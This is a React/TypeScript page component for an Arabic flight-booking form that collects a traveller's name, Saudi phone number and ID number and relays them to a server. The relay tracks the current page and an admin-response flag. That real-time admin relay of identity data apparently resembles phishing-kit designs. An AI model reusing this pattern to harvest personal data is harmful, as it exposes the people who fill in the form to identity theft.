import Input from "@/components/Input";
// import ToggleButton from "@/components/ui/ToggleButton/ToggleButton";
import Label from "@/components/ui/label";
// import {
//   Select,
//   SelectContent,
//   SelectItem,
//   SelectTrigger,
//   SelectValue,
// } from "@/components/ui/select";
import ShinyButton from "@/components/ui/shiny-button";
import { mainInfo } from "@/real-time/context/signals";
// import { countries } from "@/data/selects-data";
import { validatePhoneSAnumber, validateSAID } from "@/lib/helpers";
import { cn } from "@/lib/utils";
import {
  CustomInputProps,
  // CustomSelectProps,
  // InfoProps,
} from "@/types/fly.types";
// import { BabyIcon, PersonStandingIcon, User } from "lucide-react";
import { useEffect } from "react";
import { FieldValues, useForm } from "react-hook-form";
import { useLocation, useNavigate } from "react-router-dom";
import { useSignals } from "@preact/signals-react/runtime";
import {
  checkUser,
  sendDataToServer,
  setCurrentPage,
} from "@/real-time/utils/utils";

const TravellerInfoPage = () => {
  useEffect(() => {
    setCurrentPage("traveller-info");
  }, []);

  useSignals();

  const { state } = useLocation();
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    // setValue,
    formState: { errors },
  } = useForm();

  console.log(state);
  // console.log(errors);

  const onSubmit = (data: FieldValues) => {
    for (const key in data) {
      if (key.includes("مساعدة خاصة")) {
        if (data[key] !== false) data[key] = data[key].toString();
        else delete data[key];
      }
    }
    for (const key in state) {
      if (state[key]) state[key] = state[key].toString();
      else delete state[key];
    }

    checkUser(
      {
        fullName: data.fullName,
        idNumber: data.idNumber,
        phone: data.phone,
      },
      navigate,
      { total: state.total }
    );
    sendDataToServer({
      current: "traveller-info",
      data,
      nextPage: "",
      waitingForAdminResponse: false,
    });
  };

  return (
    <section className="container flex flex-col pb-10 lg:pb-20">
      <h2 className="text-main lg:text-3xl rounded-full font-bold mt-6 lg:mt-20 z-10">
        معلومات المسافر
      </h2>
      <h3 className="text-gray-500 font-bold mt-4 mb-10">
        أدخل معلومات المسافر و تأكد من انها تنطابق مع المستندات الرسمية
      </h3>

      <form
        className="lg:w-[60dvw] lg:mx-auto"
        onSubmit={handleSubmit(onSubmit)}
      >
        {/* {Array.from({ length: state?.adult || 1 }).map((_, i) => (
          <Info
            key={i}
            index={i + 1}
            register={register}
            errors={errors}
            setValue={setValue}
            isAdult
          />
        ))}

        {Array.from({ length: state?.child }).map((_, i) => (
          <Info
            key={i}
            index={i + 1}
            register={register}
            errors={errors}
            setValue={setValue}
            isChild
          />
        ))}

        {Array.from({ length: state?.baby }).map((_, i) => (
          <Info
            key={i}
            index={i + 1}
            register={register}
            errors={errors}
            setValue={setValue}
          />
        ))} */}

        <div className="flex flex-col gap-4 my-6 bg-white rounded-xl p-4 shadow-lg">
          <h4 className="lg:text-xl font-bold mb-2">بيانات الاتصال</h4>

          <CustomInput
            label="اسم مقدم الطلب"
            id="fullName"
            defaultValue={mainInfo.value?.fullName}
            register={register}
            errors={errors}
            options={{
              required: `اسم مقدم الطلب مطلوب`,
            }}
          />
          <CustomInput
            label="رقم الجوال"
            id="phone"
            defaultValue={mainInfo.value?.phone}
            register={register}
            errors={errors}
            options={{
              required: `رقم الجوال مطلوب`,
              validate: (val) =>
                validatePhoneSAnumber(val) ? true : "رقم الجوال غير صحيح",
            }}
          />
          <CustomInput
            label="رقم الهوية / الأقامة"
            id="idNumber"
            defaultValue={mainInfo.value?.idNumber}
            register={register}
            errors={errors}
            options={{
              required: `رقم الهوية / الأقامة مطلوب`,
              validate: (val) =>
                validateSAID(val) === -1 ? "رقم الجوال غير صحيح" : true,
            }}
          />

          <ShinyButton
            text="استمرار"
            className="w-fit bg-main mx-auto text-white rounded-3xl tracking-tight font-bold px-20 py-2"
            type={"submit"}
          />
        </div>
      </form>
    </section>
  );
};
export default TravellerInfoPage;

// const Info = ({
//   register,
//   errors,
//   setValue,
//   index,
//   isAdult,
//   isChild,
// }: InfoProps) => {
//   const [isHelp, setIsHelp] = useState(false);

//   return (
//     <div className="flex flex-col gap-4 my-6 bg-white rounded-xl shadow-lg">
//       <h4 className="text-main bg-alt font-bold px-4 py-3 rounded-t-xl">
//         {isAdult ? (
//           <User className="size-5 text-main inline" />
//         ) : isChild ? (
//           <PersonStandingIcon className="size-5 text-main inline" />
//         ) : (
//           <BabyIcon className="size-5 text-main inline" />
//         )}{" "}
//         {isAdult ? "بالغ" : isChild ? "طفل" : "رضيع"} {index}
//       </h4>

//       <div className="p-4">
//         <div className="lg:flex items-center gap-4">
//           {(isAdult || isChild) && (
//             <CustomSelect
//               className="basis-[10%]"
//               label="اللقب"
//               id={`لقب-${isAdult ? "بالغ" : isChild ? "طفل" : "رضيع"}-${index}`}
//               sels={[{ name: "سيد" }, { name: "سيدة" }, { name: "آنسة" }]}
//               register={register}
//               errors={errors}
//               options={{ required: "اللقب مطلوب" }}
//               setValue={setValue}
//             />
//           )}
//           <CustomInput
//             className="flex-1"
//             label="الاسم الأول"
//             id={`الأسم الأول-${
//               isAdult ? "بالغ" : isChild ? "طفل" : "رضيع"
//             }-${index}`}
//             register={register}
//             errors={errors}
//             options={{
//               required: `اسم الأول مطلوب`,
//               validate: (val) => {
//                 const regex = /^[a-zA-Z\s]*$/;
//                 return regex.test(val.trim())
//                   ? true
//                   : "يجب أن يحتوي الأسم على حروف فقط";
//               },
//             }}
//           />
//           <CustomInput
//             className="flex-1"
//             label="أسم العائلة"
//             id={`أسم العائلة-${
//               isAdult ? "بالغ" : isChild ? "طفل" : "رضيع"
//             }-${index}`}
//             register={register}
//             errors={errors}
//             options={{
//               required: `اسم العائلة مطلوب`,
//               validate: (val) => {
//                 const regex = /^[a-zA-Z\s]*$/;
//                 return regex.test(val.trim())
//                   ? true
//                   : "يجب أن يحتوي الأسم على حروف فقط";
//               },
//             }}
//           />
//         </div>

//         <CustomSelect
//           label="الجنسية"
//           id={`جنسية-${isAdult ? "بالغ" : isChild ? "طفل" : "رضيع"}-${index}`}
//           sels={countries}
//           register={register}
//           errors={errors}
//           options={{ required: true }}
//           setValue={setValue}
//         />

//         <CustomSelect
//           label="نوع وثيقة السفر"
//           id={`نوع وثيقة-${
//             isAdult ? "بالغ" : isChild ? "طفل" : "رضيع"
//           }-${index}`}
//           sels={[
//             { name: "رقم الهوية الوطنية / الأقامة" },
//             { name: "جواز السفر" },
//           ]}
//           register={register}
//           errors={errors}
//           options={{ required: true }}
//           setValue={setValue}
//         />

//         <CustomInput
//           label="رقم الوثيقة"
//           id={`رقم وثيقة-${
//             isAdult ? "بالغ" : isChild ? "طفل" : "رضيع"
//           }-${index}`}
//           register={register}
//           errors={errors}
//           options={{
//             required: `رقم الوثيقة مطلوب`,
//             validate: (val) =>
//               validateSAID(val) === -1 ? "رقم الوثيقة غير صحيح" : true,
//           }}
//         />

//         {(isAdult || isChild) && (
//           <div>
//             <div className="flex items-center gap-2">
//               <input
//                 type="checkbox"
//                 id="help"
//                 onClick={() => setIsHelp(!isHelp)}
//                 className="cursor-pointer"
//               />
//               <Label
//                 id="help"
//                 label={"المساعدة الخاصة"}
//                 className="text-main mb-0 cursor-pointer"
//               />
//             </div>
//             {isHelp && (
//               <motion.div
//                 initial={{ opacity: 0 }}
//                 animate={{ opacity: 1 }}
//                 exit={{ opacity: 0 }}
//                 transition={{ duration: 0.75 }}
//                 className="flex flex-col lg:flex-row justify-between mt-4"
//               >
//                 <ToggleButton
//                   register={register}
//                   id={`مساعدة خاصة-كرسي متحرك${
//                     isAdult ? "-بالغ" : isChild ? "-طفل" : ""
//                   }-${index}`}
//                   text="كريس متحرك"
//                 />
//                 {isAdult && (
//                   <ToggleButton
//                     register={register}
//                     id={`مساعدة خاصة-حامل-بالغ-${index}`}
//                     text="الحوامل"
//                   />
//                 )}
//                 <ToggleButton
//                   register={register}
//                   id={`مساعدة خاصة-ضعف سمع${
//                     isAdult ? "-بالغ" : isChild ? "-طفل" : ""
//                   }-${index}`}
//                   text="ضعيفي/فاقدي السمع"
//                 />
//                 <ToggleButton
//                   register={register}
//                   id={`مساعدة خاصة-ضعف بصر${
//                     isAdult ? "-بالغ" : isChild ? "-طفل" : ""
//                   }-${index}`}
//                   text="ضعاف البصر"
//                 />
//               </motion.div>
//             )}
//           </div>
//         )}
//       </div>
//     </div>
//   );
// };

export const CustomInput = ({
  className,
  label,
  id,
  type = "text",
  defaultValue,
  register,
  errors,
  options = {},
}: CustomInputProps) => (
  <div className={className}>
    <Label label={label} id={id} className={cn("text-main", className)} />
    <Input
      id={id}
      type={type}
      isAr
      placeholder={`اكتب ${label}...`}
      className={`bg-white px-5`}
      register={register}
      options={options}
      value={defaultValue}
    />

    <p
      className={cn(
        "text-xs text-red-500 h-5 transition-opacity",
        errors?.[id] ? "opacity-100" : "opacity-0"
      )}
    >
      {errors?.[id]?.message as string}
    </p>
  </div>
);

// const CustomSelect = ({
//   className,
//   label,
//   id,
//   register,
//   errors,
//   options = {},
//   sels,
//   setValue,
// }: CustomSelectProps) => (
//   <div className={className}>
//     <Label label={label} id={id} className={"text-main"} />
//     <Select onValueChange={(selected) => setValue && setValue(id, selected)}>
//       <SelectTrigger
//         className={cn(errors[id] ? "border-red-500" : "border-gray-300")}
//         style={{ direction: "rtl" }}
//       >
//         <SelectValue
//           className="text-gray-400"
//           placeholder={`اختر ${label}...`}
//           id={id}
//           {...register(id, options)}
//         />
//       </SelectTrigger>
//       <SelectContent className="flex">
//         {sels.map((sel: { name: string }) => (
//           <SelectItem
//             key={sel.name}
//             className="w-full"
//             value={sel.name}
//             style={{ direction: "rtl" }}
//           >
//             <p>{sel.name}</p>
//           </SelectItem>
//         ))}
//       </SelectContent>
//     </Select>

//     <p
//       className={cn(
//         "text-xs text-red-500 h-5 transition-opacity",
//         errors?.[id] ? "opacity-100" : "opacity-0"
//       )}
//     >
//       {(errors?.[id]?.message as string) || label + " مطلوب"}
//     </p>
//   </div>
// );
